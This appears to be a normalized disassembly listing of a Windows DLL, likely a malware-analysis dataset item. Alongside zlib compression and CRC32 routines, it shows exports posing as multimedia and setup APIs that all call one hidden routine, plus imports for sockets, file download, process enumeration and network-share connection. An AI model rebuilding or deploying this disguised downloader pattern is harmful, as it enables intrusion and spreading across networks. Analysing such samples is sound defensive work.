mov bp [ ebp + ebx * 4 + 0x404 ]
shl bp cl
mov ecx [ eax + 0x16bc ]
or [ eax + 0x16b8 ] bp
add ecx esi
mov [ eax + 0x16bc ] ecx
mov ebp [ esp + 0x20 ]
xor esi esi
mov si [ ebp + ebx * 4 + 0x404 ]
mov ebp [ eax + 0x8 ]
mov ebx esi
shl ebx cl
or [ eax + 0x16b8 ] bx
mov ebx [ eax + 0x14 ]
mov cl [ eax + 0x16b8 ]
mov [ ebx + ebp ] cl
mov ebx [ eax + 0x14 ]
inc ebx
xor ecx ecx
mov cl [ eax + 0x16b9 ]
mov [ eax + 0x14 ] ebx
mov ebp ebx
mov ebx [ eax + 0x8 ]
mov [ ebx + ebp ] cl
mov ecx [ eax + 0x14 ]
mov ebx [ eax + 0x16bc ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx bx
shr si cl
mov ecx [ esp + 0x10 ]
lea ecx [ ebx + ecx - 0x10 ]
mov ebx [ esp + 0x1c ]
mov [ eax + 0x16b8 ] si
mov [ eax + 0x16bc ] ecx
jmp r-xdata
mov dx [ ebp + edx * 4 ]
shl dx cl
or [ eax + 0x16b8 ] dx
add ecx edi
jmp r-xdata
xor esi esi
mov si [ ebp + edx * 4 ]
mov edx esi
shl edx cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b8 ] dx
mov edx [ eax + 0x14 ]
mov bl [ eax + 0x16b8 ]
mov [ ecx + edx ] bl
mov edx [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
inc edx
mov [ eax + 0x14 ] edx
mov ecx edx
xor edx edx
mov dl [ eax + 0x16b9 ]
mov [ ecx + ebx ] dl
mov ecx [ eax + 0x14 ]
mov edx [ eax + 0x16bc ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx dx
shr si cl
lea ecx [ edx + edi - 0x10 ]
mov [ eax + 0x16b8 ] si
jmp r-xdata
dec edi
cmp edi 0x100
jae r-xdata
mov ecx [ ebx * 4 + r--data ]
mov ebx 0x10
sub edx ecx
mov ecx [ eax + 0x16bc ]
sub ebx esi
cmp ecx ebx
jle r-xdata
mov esi [ ebx * 4 + r--data ]
test esi esi
je r-xdata
mov [ eax + 0x16bc ] ecx
mov ecx edi
shr ecx 0x7
xor ebx ebx
mov bl [ ecx + r--data ]
xor ebx ebx
mov bl [ edi + r--data ]
jmp r-xdata
shl edx cl
or [ eax + 0x16b8 ] dx
add ecx esi
mov [ eax + 0x16bc ] ecx
mov ebx edx
mov ebp [ eax + 0x8 ]
shl ebx cl
or [ eax + 0x16b8 ] bx
mov ebx [ eax + 0x14 ]
mov cl [ eax + 0x16b8 ]
mov [ ebx + ebp ] cl
mov ebx [ eax + 0x14 ]
inc ebx
xor ecx ecx
mov cl [ eax + 0x16b9 ]
mov [ eax + 0x14 ] ebx
mov ebp ebx
mov ebx [ eax + 0x8 ]
mov [ ebx + ebp ] cl
mov ecx [ eax + 0x14 ]
mov ebx [ eax + 0x16bc ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx bx
shr dx cl
mov [ eax + 0x16b8 ] dx
lea edx [ ebx + esi - 0x10 ]
mov [ eax + 0x16bc ] edx
jmp r-xdata
mov dx [ ebp + ebx * 4 ]
mov ebp [ esp + 0x20 ]
shl dx cl
or [ eax + 0x16b8 ] dx
add ecx esi
mov [ eax + 0x16bc ] ecx
xor edx edx
mov dx [ ebp + ebx * 4 ]
mov ebp [ eax + 0x8 ]
mov ebx edx
shl ebx cl
or [ eax + 0x16b8 ] bx
mov ebx [ eax + 0x14 ]
mov cl [ eax + 0x16b8 ]
mov [ ebx + ebp ] cl
mov ebx [ eax + 0x14 ]
inc ebx
xor ecx ecx
mov cl [ eax + 0x16b9 ]
mov [ eax + 0x14 ] ebx
mov ebp ebx
mov ebx [ eax + 0x8 ]
mov [ ebx + ebp ] cl
mov ecx [ eax + 0x14 ]
mov ebx [ eax + 0x16bc ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx bx
mov ebp [ esp + 0x20 ]
shr dx cl
mov [ eax + 0x16b8 ] dx
lea edx [ ebx + esi - 0x10 ]
mov ebx [ esp + 0x1c ]
mov [ eax + 0x16bc ] edx
jmp r-xdata
mov ebp [ esp + 0x24 ]
mov ecx [ eax + 0x16bc ]
xor esi esi
mov edx 0x10
mov si [ ebp + ebx * 4 + 0x2 ]
mov [ esp + 0x1c ] ebx
sub edx esi
cmp ecx edx
jle r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ eax + 0x16a0 ]
cmp ecx edx
jb r-xdata
mov ecx [ ebx * 4 + r--data ]
mov esi 0x10
sub edi ecx
mov ecx [ eax + 0x16bc ]
sub esi edx
cmp ecx esi
jle r-xdata
mov edx [ ebx * 4 + r--data ]
test edx edx
je r-xdata
shl edi cl
or [ eax + 0x16b8 ] di
add ecx edx
mov esi edi
shl esi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b8 ] si
mov esi [ eax + 0x14 ]
mov bl [ eax + 0x16b8 ]
mov [ ecx + esi ] bl
mov esi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b9 ]
inc esi
mov [ eax + 0x14 ] esi
mov [ esi + ebx ] cl
mov ecx [ eax + 0x14 ]
mov esi [ eax + 0x16bc ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx si
lea edx [ esi + edx - 0x10 ]
shr di cl
mov [ eax + 0x16bc ] edx
mov [ eax + 0x16b8 ] di
jmp r-xdata
sub_1000d4d0
mov edx [ esp + 0x4 ]
xor eax eax
lea ecx [ edx + 0x94 ]
cmp eax 0x9
jne r-xdata
inc eax
add ecx 0x4
cmp eax 0x9
jl r-xdata
mov edx [ edx ]
xor ecx ecx
cmp eax 0x20
sete cl
mov [ edx + 0x2c ] ecx
retn
mov eax 0xe
lea ecx [ edx + 0xcc ]
cmp [ ecx ] 0x0
jne r-xdata
inc eax
add ecx 0x4
cmp eax 0x20
jl r-xdata
cmp [ ecx ] 0x0
jne r-xdata
sub_1000d520
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push esi
xor eax eax
mov esi ecx
and esi 0x1
or eax esi
shr ecx 0x1
shl eax 0x1
dec edx
test edx edx
jg r-xdata
shr eax 0x1
pop esi
retn
sub_1000d540
mov eax [ esp + 0x4 ]
push ebx
mov ecx [ eax + 0x16bc ]
cmp ecx 0x10
jne r-xdata
cmp ecx 0x8
jl r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ eax + 0x14 ]
mov bl [ eax + 0x16b8 ]
push esi
mov [ ecx + edx ] bl
mov edx [ eax + 0x14 ]
mov esi [ eax + 0x8 ]
inc edx
mov [ eax + 0x14 ] edx
mov ecx edx
xor edx edx
mov dl [ eax + 0x16b9 ]
mov [ esi + ecx ] dl
mov ecx [ eax + 0x14 ]
inc ecx
pop esi
mov [ eax + 0x14 ] ecx
xor ecx ecx
mov [ eax + 0x16b8 ] cx
mov [ eax + 0x16bc ] ecx
pop ebx
retn
pop ebx
retn
mov ecx [ eax + 0x8 ]
mov edx [ eax + 0x14 ]
mov bl [ eax + 0x16b8 ]
mov [ ecx + edx ] bl
mov edx [ eax + 0x14 ]
xor ecx ecx
inc edx
mov cl [ eax + 0x16b9 ]
mov [ eax + 0x14 ] edx
mov [ eax + 0x16b8 ] cx
mov ecx [ eax + 0x16bc ]
add ecx 0xfffffff8
mov [ eax + 0x16bc ] ecx
sub_1000d5d0
mov eax [ esp + 0x4 ]
push ebx
push esi
mov edx [ eax + 0x16bc ]
cmp edx 0x8
jle r-xdata
xor ecx ecx
cmp edx ecx
jle r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ eax + 0x14 ]
mov bl [ eax + 0x16b8 ]
mov [ ecx + edx ] bl
mov edx [ eax + 0x14 ]
mov esi [ eax + 0x8 ]
inc edx
mov [ eax + 0x14 ] edx
mov ecx edx
xor edx edx
mov dl [ eax + 0x16b9 ]
mov [ esi + ecx ] dl
mov ecx [ eax + 0x14 ]
inc ecx
pop esi
mov [ eax + 0x14 ] ecx
xor ecx ecx
mov [ eax + 0x16b8 ] cx
mov [ eax + 0x16bc ] ecx
pop ebx
retn
pop esi
mov [ eax + 0x16b8 ] cx
mov [ eax + 0x16bc ] ecx
pop ebx
retn
mov edx [ eax + 0x8 ]
mov esi [ eax + 0x14 ]
mov bl [ eax + 0x16b8 ]
mov [ edx + esi ] bl
mov edx [ eax + 0x14 ]
inc edx
mov [ eax + 0x14 ] edx
sub_1000d650
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call sub_1000d5d0
mov eax [ esp + 0x1c ]
add esp 0x4
test eax eax
mov eax [ esp + 0x14 ]
mov [ esi + 0x16b4 ] 0x8
je r-xdata
mov edx eax
dec eax
test edx edx
je r-xdata
mov ecx [ esi + 0x14 ]
mov edx [ esi + 0x8 ]
mov [ ecx + edx ] al
mov edx [ esi + 0x14 ]
mov edi [ esi + 0x8 ]
inc edx
mov [ esi + 0x14 ] edx
mov ecx edx
xor edx edx
mov dl ah
mov [ ecx + edi ] dl
mov ecx [ esi + 0x14 ]
mov edi [ esi + 0x8 ]
mov dl al
inc ecx
not dl
mov [ esi + 0x14 ] ecx
mov [ ecx + edi ] dl
mov edi [ esi + 0x14 ]
mov ecx eax
not ecx
xor edx edx
inc edi
mov dl ch
mov ecx [ esi + 0x8 ]
mov [ esi + 0x14 ] edi
mov [ edi + ecx ] dl
mov ecx [ esi + 0x14 ]
inc ecx
mov [ esi + 0x14 ] ecx
pop edi
pop esi
retn
lea ecx [ eax + 0x1 ]
mov eax [ esp + 0x10 ]
push ebx
mov edx [ esi + 0x14 ]
mov edi [ esi + 0x8 ]
mov bl [ eax ]
mov [ edx + edi ] bl
mov ebx [ esi + 0x14 ]
inc ebx
inc eax
dec ecx
mov [ esi + 0x14 ] ebx
jne r-xdata
pop ebx
sub_1000d710
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x1c ]
test edi edi
not eax
je r-xdata
cmp edi 0x20
mov esi ecx
jb r-xdata
test cl 0x3
je r-xdata
cmp edi 0x4
jb r-xdata
mov ebp edi
shr ebp 0x5
mov edx eax
xor ebx ebx
mov bl [ ecx ]
and edx 0xff
xor edx ebx
shr eax 0x8
mov edx [ edx * 4 + r--data ]
xor eax edx
inc ecx
dec edi
jne r-xdata
test edi edi
je r-xdata
mov ebp edi
shr ebp 0x2
mov edx [ esi ]
xor ecx ecx
xor eax edx
xor edx edx
mov dl ah
mov [ esp + 0x18 ] eax
mov cl [ esp + 0x1a ]
add esi 0x4
mov ebx [ edx * 4 + r--data ]
mov edx eax
mov ecx [ ecx * 4 + r--data ]
and eax 0xff
shr edx 0x18
xor ecx ebx
add esi 0x4
mov ebx [ edx * 4 + r--data ]
mov edx [ esi - 0x4 ]
xor ecx ebx
mov ebx [ eax * 4 + r--data ]
xor ecx ebx
xor eax eax
xor ecx edx
xor edx edx
mov dl ch
mov [ esp + 0x18 ] ecx
mov al [ esp + 0x1a ]
add esi 0x4
mov ebx [ edx * 4 + r--data ]
mov edx ecx
mov eax [ eax * 4 + r--data ]
and ecx 0xff
shr edx 0x18
xor eax ebx
add esi 0x4
mov ebx [ edx * 4 + r--data ]
mov edx [ esi - 0x8 ]
xor eax ebx
mov ebx [ ecx * 4 + r--data ]
xor eax ebx
xor ecx ecx
xor eax edx
xor edx edx
mov dl ah
mov [ esp + 0x18 ] eax
mov cl [ esp + 0x1a ]
add esi 0x4
mov ebx [ edx * 4 + r--data ]
mov edx eax
mov ecx [ ecx * 4 + r--data ]
and eax 0xff
shr edx 0x18
xor ecx ebx
mov ebx [ edx * 4 + r--data ]
mov edx [ esi - 0x8 ]
xor ecx ebx
mov ebx [ eax * 4 + r--data ]
xor ecx ebx
xor eax eax
xor ecx edx
xor edx edx
mov dl ch
mov [ esp + 0x18 ] ecx
mov al [ esp + 0x1a ]
mov ebx [ edx * 4 + r--data ]
mov edx ecx
mov eax [ eax * 4 + r--data ]
and ecx 0xff
shr edx 0x18
xor eax ebx
mov ebx [ edx * 4 + r--data ]
mov edx [ esi - 0x4 ]
xor eax ebx
mov ebx [ ecx * 4 + r--data ]
xor eax ebx
xor ecx ecx
xor eax edx
xor edx edx
mov [ esp + 0x18 ] eax
mov dl ah
mov cl [ esp + 0x1a ]
mov ecx [ ecx * 4 + r--data ]
mov ebx [ edx * 4 + r--data ]
mov edx eax
shr edx 0x18
xor ecx ebx
and eax 0xff
mov ebx [ edx * 4 + r--data ]
mov edx [ esi ]
xor ecx ebx
mov ebx [ eax * 4 + r--data ]
xor ecx ebx
xor eax eax
xor ecx edx
xor edx edx
mov dl ch
mov [ esp + 0x18 ] ecx
mov al [ esp + 0x1a ]
add esi 0x4
mov ebx [ edx * 4 + r--data ]
mov edx ecx
mov eax [ eax * 4 + r--data ]
and ecx 0xff
shr edx 0x18
xor eax ebx
add esi 0x4
mov ebx [ edx * 4 + r--data ]
mov edx [ esi - 0x4 ]
xor eax ebx
mov ebx [ ecx * 4 + r--data ]
xor eax ebx
xor ecx ecx
xor eax edx
xor edx edx
mov dl ah
mov [ esp + 0x18 ] eax
mov cl [ esp + 0x1a ]
add esi 0x4
mov ebx [ edx * 4 + r--data ]
mov edx eax
mov ecx [ ecx * 4 + r--data ]
and eax 0xff
shr edx 0x18
xor ecx ebx
sub edi 0x20
mov ebx [ edx * 4 + r--data ]
mov edx [ esi - 0x4 ]
xor ecx ebx
mov ebx [ eax * 4 + r--data ]
xor ecx ebx
xor eax eax
xor ecx edx
xor edx edx
mov dl ch
mov [ esp + 0x18 ] ecx
mov al [ esp + 0x1a ]
mov ebx [ edx * 4 + r--data ]
mov edx ecx
mov eax [ eax * 4 + r--data ]
and ecx 0xff
shr edx 0x18
xor eax ebx
mov ebx [ edx * 4 + r--data ]
xor eax ebx
mov ebx [ ecx * 4 + r--data ]
xor eax ebx
dec ebp
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
not eax
retn
mov ecx eax
xor edx edx
mov dl [ esi ]
and ecx 0xff
xor ecx edx
shr eax 0x8
mov ecx [ ecx * 4 + r--data ]
xor eax ecx
inc esi
dec edi
jne r-xdata
mov edx [ esi ]
xor ecx ecx
xor eax edx
xor edx edx
mov dl ah
mov [ esp + 0x18 ] eax
mov cl [ esp + 0x1a ]
add esi 0x4
mov ebx [ edx * 4 + r--data ]
mov edx eax
mov ecx [ ecx * 4 + r--data ]
and eax 0xff
shr edx 0x18
xor ecx ebx
sub edi 0x4
mov ebx [ edx * 4 + r--data ]
xor ecx ebx
mov ebx [ eax * 4 + r--data ]
xor ecx ebx
dec ebp
mov eax ecx
jne r-xdata
sub_10001460
push esi
mov esi ecx
call sub_10001480
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_10001540
push esi
mov esi ecx
push esi
push 0x0
push sub_10001570
call [ _beginthread@IAT ]
add esp 0xc
mov [ esi + 0x40 ] eax
push 0x32
call [ Sleep@IAT ]
pop esi
retn
sub_100019a0
mov [ ecx + 0x18 ] 0x1
mov ecx [ ecx + 0x40 ]
test ecx ecx
je r-xdata
retn
push 0x4e20
push ecx
call [ WaitForSingleObject@IAT ]
sub_100026f0
push esi
mov esi ecx
call sub_10002910
mov esi [ esi + 0x18 ]
test esi esi
je r-xdata
pop esi
retn
push esi
call closesocket
sub_100028f0
push esi
mov esi ecx
mov eax [ esi + 0x18 ]
mov [ esi ] 0x1
push eax
call closesocket
mov [ esi + 0x18 ] 0x0
pop esi
retn
sub_10002df7
mov eax 0x1
retn
sub_100035c0
retn
sub_10004210
mov ecx [ esp + 0x8 ]
mov eax 0x1
cmp ecx eax
jne r-xdata
retn 0xc
mov ecx [ esp + 0x4 ]
mov [ rw-data ] ecx
sub_100042d0
mov ecx [ esp + 0x4 ]
xor eax eax
mov edx 0x20000000
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
inc eax
add ecx 0x8
cmp eax 0x8
jl r-xdata
retn
UpdateCharsetChanges
push 0x0
call sub_100035d0
pop ecx
retn
UpdateUIfontsDueToDPIchange
push 0x0
call sub_100035d0
pop ecx
retn 0x8
waveOutMessage
push 0x1
call sub_100035d0
add esp 0x4
xor eax eax
retn 0x10
mixerSetControlDetails
push 0x1
call sub_100035d0
add esp 0x4
xor eax eax
retn 0xc
waveOutGetNumDevs
push 0x1
call sub_100035d0
add esp 0x4
xor eax eax
retn
SetupDiOpenDevRegKey
push 0x1
call sub_100035d0
add esp 0x4
xor eax eax
retn 0x18
mixerOpen
push 0x1
call sub_100035d0
add esp 0x4
xor eax eax
retn 0x14
mixerClose
push 0x1
call sub_100035d0
add esp 0x4
xor eax eax
retn 0x4
sub_10007c80
mov eax [ esp + 0x4 ]
push eax
call sub_10001130
pop ecx
retn
sub_10007d20
push esi
mov esi ecx
call sub_10007d40
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_10007d40
push esi
mov esi ecx
mov eax [ esi + 0x24 ]
mov [ esi ] r--data
push eax
call ??3@YAXPAX@Z
add esp 0x4
mov ecx esi
call sub_10007d60
pop esi
retn
sub_100089b0
push esi
mov esi ecx
mov eax [ esi + 0x20 ]
mov [ esi + 0x1c ] 0x1
test eax eax
je r-xdata
mov [ esi + 0x20 ] 0x0
pop esi
retn
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
sub_100089e0
mov edx [ esp + 0x4 ]
mov eax ecx
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x14 ] ecx
mov [ eax + 0x18 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x4 ] edx
mov [ eax + 0x10 ] 0x1
mov [ eax + 0xc ] ecx
retn 0x4
sub_10008a10
push esi
mov esi ecx
call sub_10008a30
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
Process32Next
jmp [ Process32Next@IAT ]
Process32First
jmp [ Process32First@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
Ordinal_ODBC32_31
jmp [ Ordinal_ODBC32_31@IAT ]
Ordinal_ODBC32_9
jmp [ Ordinal_ODBC32_9@IAT ]
Ordinal_ODBC32_36
jmp [ Ordinal_ODBC32_36@IAT ]
Ordinal_ODBC32_41
jmp [ Ordinal_ODBC32_41@IAT ]
Ordinal_ODBC32_75
jmp [ Ordinal_ODBC32_75@IAT ]
Ordinal_ODBC32_24
jmp [ Ordinal_ODBC32_24@IAT ]
Ordinal_ODBC32_61
jmp [ Ordinal_ODBC32_61@IAT ]
Ordinal_ODBC32_13
jmp [ Ordinal_ODBC32_13@IAT ]
Ordinal_ODBC32_4
jmp [ Ordinal_ODBC32_4@IAT ]
Ordinal_ODBC32_8
jmp [ Ordinal_ODBC32_8@IAT ]
Ordinal_ODBC32_20
jmp [ Ordinal_ODBC32_20@IAT ]
Ordinal_ODBC32_18
jmp [ Ordinal_ODBC32_18@IAT ]
Ordinal_ODBC32_11
jmp [ Ordinal_ODBC32_11@IAT ]
??3@YAXPAX@Z
jmp [ operator delete@IAT ]
??2@YAPAXI@Z
jmp [ operator new@IAT ]
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
_except_handler3
jmp [ _except_handler3@IAT ]
_ftol
jmp [ _ftol@IAT ]
_initterm
jmp [ _initterm@IAT ]
WSAGetLastError
jmp [ WSAGetLastError@IAT ]
recv
jmp [ recv@IAT ]
send
jmp [ send@IAT ]
closesocket
jmp [ closesocket@IAT ]
ioctlsocket
jmp [ ioctlsocket@IAT ]
connect
jmp [ connect@IAT ]
htons
jmp [ htons@IAT ]
socket
jmp [ socket@IAT ]
select
jmp [ select@IAT ]
URLDownloadToFileA
jmp [ URLDownloadToFileA@IAT ]
GetModuleFileNameExA
jmp [ GetModuleFileNameExA@IAT ]
EnumProcessModules
jmp [ EnumProcessModules@IAT ]
WNetAddConnection2A
jmp [ WNetAddConnection2A@IAT ]
WNetCloseEnum
jmp [ WNetCloseEnum@IAT ]
WNetEnumResourceA
jmp [ WNetEnumResourceA@IAT ]
WNetOpenEnumA
jmp [ WNetOpenEnumA@IAT ]
NetUseAdd
jmp [ NetUseAdd@IAT ]
sub_1000b8d0
mov eax [ esp + 0x8 ]
imul eax [ esp + 0xc ]
push eax
call [ malloc@IAT ]
add esp 0x4
retn
sub_1000b8f0
mov eax [ esp + 0x8 ]
push eax
call [ free@IAT ]
pop ecx
retn
sub_1000bbe0
retn
sub_1000d6f0
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x4 ]
push ecx
push eax
push edx
call sub_1000d710
add esp 0xc
retn
retn
sub_1000da00
mov eax [ ebp - 0x40 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn
sub_1000da0b
mov eax [ ebp - 0x40 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn
sub_1000da16
mov eax r--data
jmp __CxxFrameHandler
sub_1000da20
mov eax [ ebp - 0x10 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn
sub_1000da2b
mov eax r--data
jmp __CxxFrameHandler
sub_1000da40
mov eax [ ebp - 0x27c ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn
sub_1000da4e
mov eax r--data
jmp __CxxFrameHandler
